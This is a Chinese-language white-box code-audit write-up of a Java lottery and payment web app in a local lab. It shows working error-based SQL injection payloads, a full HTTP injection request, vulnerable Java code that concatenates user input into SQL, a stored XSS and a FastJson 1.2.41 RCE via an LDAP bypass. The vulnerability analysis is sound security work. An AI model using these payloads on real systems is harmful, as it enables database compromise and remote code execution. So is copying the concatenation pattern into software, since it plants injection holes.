
![](https://bbs.kanxue.com/upload/attach/202207/809626_CJCNRQ2GY2J8FZ6.jpg)

```
select * from codepay_order where pay_id='1' and extractvalue(1,concat(0x5c,user()))--' and pay_tag>=0 and money>=200 and pay_tag <FLOOR(money/200) and up_time >='2019-1-15 0:0:0'
```

这里可以看到注释后面的单引号跟 `up_time` 字段的单引号合在一起了，导致了报错，所以需要加上单引号就可以成功

![](https://bbs.kanxue.com/upload/attach/202207/809626_XX7XP9RJ64EEHQS.jpg)

## 2、SQL注入二处

![](https://bbs.kanxue.com/upload/attach/202207/809626_9ZDC9FKFE68N3QB.jpg)

那么想一下，有没有方法调了`canDog`方法，鼠标放在`canDog`方法上按下Command（Windows下是alt或者ctrl）可以看到有哪些方法调用了该方法

![](https://bbs.kanxue.com/upload/attach/202207/809626_39X27T649TAG9QG.jpg)

`lottery`接口，那么肯定也是有sql注入的，因为这里将`UID`传给了下面

```
@RequestMapping("lottery")
public JSONObject wheelLottery(String uid){
    boolean flag=canDog(uid);
    if(!flag){
        return fail("没有可抽奖次数");
    }
    LuckUser luckUser = new LuckUser();
    luckUser.setUid(uid);
    LuckUser luckUser1 = luckUserService.queryOne(luckUser);
    if(luckUser1==null){
        luckUserService.add(luckUser);
    }
}
```

![](https://bbs.kanxue.com/upload/attach/202207/809626_WX252A6HK8UD7AM.jpg)

那么这里用同样的payload也可以注入

![](https://bbs.kanxue.com/upload/attach/202207/809626_PZYGP2EAMVYFN2R.jpg)

严格来说这里算是一处SQL注入，因为在业务上只需要修`canDog`这一个接口就可以了

## 3、后台存储XSS

![](https://bbs.kanxue.com/upload/attach/202207/809626_4TBXDH7TS5X4AEC.jpg)

没什么好说的

![](https://bbs.kanxue.com/upload/attach/202207/809626_FZT48Y7B2K9N8MV.jpg)

直接取这里的返回数据展示在前端了，并且在`list`接口也没过滤

![](https://bbs.kanxue.com/upload/attach/202207/809626_JUFPFRKD2VAJV3N.jpg)

![](https://bbs.kanxue.com/upload/attach/202207/809626_2RUJW489VVRNZ27.jpg)

## 4、FastJson 1.2.41 RCE

![](https://bbs.kanxue.com/upload/attach/202207/809626_CJ4YBMHE43Q3F33.jpg)

看到请求中有JSON，马上想到会不会有FastJson，在`pom.xml`中搜了一下，笑嘻了，1.2.41，全局搜一下开没开`autype`

![](https://bbs.kanxue.com/upload/attach/202207/809626_N2HSHTEGAR77ETT.jpg)

![](https://bbs.kanxue.com/upload/attach/202207/809626_XJTM6B2UXKAZZ44.jpg)

但是有个通杀payload可以试试 <1.2.47的双键绕过

> 这里插件也扫到了

![](https://bbs.kanxue.com/upload/attach/202207/809626_YDNSZ8YVD6RPRKU.jpg)

这里的payload用了Unicode编码，解码之后如下

![](https://bbs.kanxue.com/upload/attach/202207/809626_G4Z6EN3WZ6K9B8N.jpg)

看上去和常规的payload差不多，这里只是变成了两个键值对，打`ldap`的话，那就尝试复现一下

![](https://bbs.kanxue.com/upload/attach/202207/809626_YNHBHNRNDD5BQTT.jpg)

![](https://bbs.kanxue.com/upload/attach/202207/809626_UJWMBRWTGHM66GC.jpg)

成功RCE

### FastJson 1.2.41

推荐文章: [FastJson<=1.2.47RCE细枝末节详细分析 - 安全客，安全资讯平台](d3cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1J5y4o6R3J5x3l9`.`.

## 5、SQL注入三处

![](https://bbs.kanxue.com/upload/attach/202207/809626_WQSNXHKPJHQFYAW.jpg)

![](https://bbs.kanxue.com/upload/attach/202207/809626_P5CKBUZPEYCJRUP.jpg)

跟过去可以看到这里的接口是`/luck/lup/update`

在前端页面中可以看到

![](https://bbs.kanxue.com/upload/attach/202207/809626_9BS6TZERQ4WG4C7.jpg)

构造参数

```
{"id":1,"exchange":1,"pname":1,"uid":1}
```

![](https://bbs.kanxue.com/upload/attach/202207/809626_B2MXAJJ9P7PWSHX.jpg)

这里报错了，看一下具体的接口实现代码

![](https://bbs.kanxue.com/upload/attach/202207/809626_HD9D5HNSHNFD7DQ.jpg)

```
@Override
protected void afterUpdate(Map map) {
    if(map!=null){
        Integer exchange = (Integer) map.get("exchange");
        if(exchange!=null){
            String pname = (String) map.get("pname");
            if(pname.contains("元")){
                String money = pname.substring(0, pname.indexOf("元"));
                int anInt = Integer.parseInt(money);
                String uid = (String) map.get("uid");
                jdbcTemplate.update("update login_user set user_money=user_money+"+anInt+" where app_login_id='"+uid+"'");
            }
        }
    }
    super.afterUpdate(map);
}
```

首选从`map`中get出来`exchange`的值，随后如果`exchange`如果不为空的话，就从`map`中get出来`pname`的值，并赋值给`pname`，Java是强类型的语言这里定义接收`pname`的值使用的是`String Name`，我们POST的参数是`int`类型，就会导致出现报错，并且在下面中会通过`contains`方法来判断元这个字是否在`map.get('pname')`这里获取出来的值中，如果不在，也是不会走下面的逻辑的

> Tips: Java `contains()`方法

> `contains()` 方法用于判断字符串中是否包含指定的字符或字符串。

> 函数原形: `public boolean contains(CharSequence chars)`

> - `chars`参数
>   - 需要判断的字符
> - Demo举例
>   `String name = 'UzJu';`
>   `name.contains("U")`
>   这时就会判断，`name`这个字符串中是否存在`U`这个字符，并且返回`True`和`False`

所以这里需要将`pname`的值更改一下

![](https://bbs.kanxue.com/upload/attach/202207/809626_X58J9AMYHFEMPPA.jpg)

可以打上一个断点，随后再次请求这个接口，然后还是会报错`String`类型的错误，这时候`DEBUG`看一眼，会发现漏了一个点

![](https://bbs.kanxue.com/upload/attach/202207/809626_E3SKB4V8XYRCM3H.jpg)

这里的`UID`需要是`String`类型，我们传入的是`int`，所以修改为`String`再次请求

![](https://bbs.kanxue.com/upload/attach/202207/809626_JQPSV74BH3U7YTS.jpg)

随后发现这里没有这个表，自己去新增

![image-20220714162155169](https://bbs.kanxue.com/upload/attach/202207/809626_K2FW6VAKRJXP99U.jpg)

![image-20220714162215259](https://bbs.kanxue.com/upload/attach/202207/809626_ED9FKP8ECE9T2ZJ.jpg)

添加了6个字段才成功，还是一样白盒模式下可以打印SQL语句

![](https://bbs.kanxue.com/upload/attach/202207/809626_ZMRJZHDJEM43HP4.jpg)

修改完之后重启

![](https://bbs.kanxue.com/upload/attach/202207/809626_QQVF95DRNC9MGMK.jpg)

可以看到加上单引号之后报错

![](https://bbs.kanxue.com/upload/attach/202207/809626_ZK35NVG8Y5DE335.jpg)

构造参数，成功注入

```
POST /luck/lup/update HTTP/1.1
Host: 192.168.2.147:7777
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Mobile Safari/537.36 Edg/103.0.1264.44
X-Requested-With: XMLHttpRequest
Referer: http://192.168.2.147:7777/luck/luckmanager.html
Accept-Encoding: gzip, deflate
Content-type: application/json
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Length: 94

{"id":1,"exchange":1,"pname":"1元","uid":"1' and extractvalue(1,concat(0x5c,user()))--'"}
```

## 6、SQL注入四处[假的SQL注入]

![](https://bbs.kanxue.com/upload/attach/202207/809626_X7GUC9YRKSHWUUJ.jpg)

这里注入有一个前提，来看一代码，这里下面的`UPDATE`也是直接+号拼接了语句，但是上面有一个`if`判断，判断返回的`map`是不是空或者大小是不是0，那么`Debug`调一下会发现

![](https://bbs.kanxue.com/upload/attach/202207/809626_7PKSNHTDVXBNS9T.jpg)

```
select * from codepay_order where pay_id='1' and pay_tag>=0 and money>=200 and pay_tag <FLOOR(money/200) and up_time >='2019-1-15 0:0:0'
```

首先在`codepay_order`这个表中`pay_id`要等于1，并且`pay_tar`大于或者等于0，并且`Money`需要大于或等于200，并且`floor`计算出来的值需要小于`Pay_tag`，那么这里看一下`floor`的值是多少

![](https://bbs.kanxue.com/upload/attach/202207/809626_HQWJWRTAY3HBCTQ.jpg)

这里的条件肯定就已经不成立了，因为这里的`pay_tag`是1，那么这里想让条件成立的话，就把数据库中的`pay_tag`改为0即可

![](https://bbs.kanxue.com/upload/attach/202207/809626_FHUFH96GUYWFD4P.jpg)

![](https://bbs.kanxue.com/upload/attach/202207/809626_W44PMW7NKHSD69F.jpg)

重新请求之后可以看到，已经走到了`update`的流程

```
HTTP/1.1 500
Content-Type: application/json;charset=UTF-8
Date: Wed, 06 Jul 2022 10:20:36 GMT
Connection: close
Content-Length: 364

{"timestamp":"2022-07-06T10:20:36.094+0000","status":500,"error":"Internal Server Error","message":"StatementCallback; bad SQL grammar [update codepay_order set pay_tag=pay_tag+1 where pay_id='1' and pay_no='null']; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column 'pay_no' in 'where clause'","path":"/luck/wheel/test"}
```

从这里的报错可以看出来，好像没有这个字段，去数据库里面添加

![](https://bbs.kanxue.com/upload/attach/202207/809626_NGA2T84JM8QQXBQ.jpg)

再次请求接口会返回`TRUE`
